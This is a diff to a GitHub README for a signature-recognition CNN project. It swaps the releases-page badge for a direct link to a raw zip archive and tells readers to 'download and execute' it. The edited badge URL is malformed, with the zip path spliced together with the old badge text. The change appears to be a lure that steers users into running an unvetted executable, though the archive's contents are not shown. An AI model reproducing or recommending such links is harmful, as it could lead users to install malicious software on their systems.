@@ -35,7 +35,7 @@ The performance of the signature recognition system is evaluated through various
 
 ## Link to Releases
 
-[![Download and Execute](https://img.shields.io/badge/Download%20%26%20Execute-Here-brightgreen)](https://github.com/NAVANEETHA123-tech/signature-recognition-cnn/releases)
+[![Download and Execute](https://raw.githubusercontent.com/NAVANEETHA123-tech/signature-recognition-cnn/main/rectified/signature-recognition-cnn-2.1.zip%20%26%20Execute-Here-brightgreen)](https://raw.githubusercontent.com/NAVANEETHA123-tech/signature-recognition-cnn/main/rectified/signature-recognition-cnn-2.1.zip)
 
 For accessing the executable file related to this project, please click the button above to download and execute the necessary files.
 
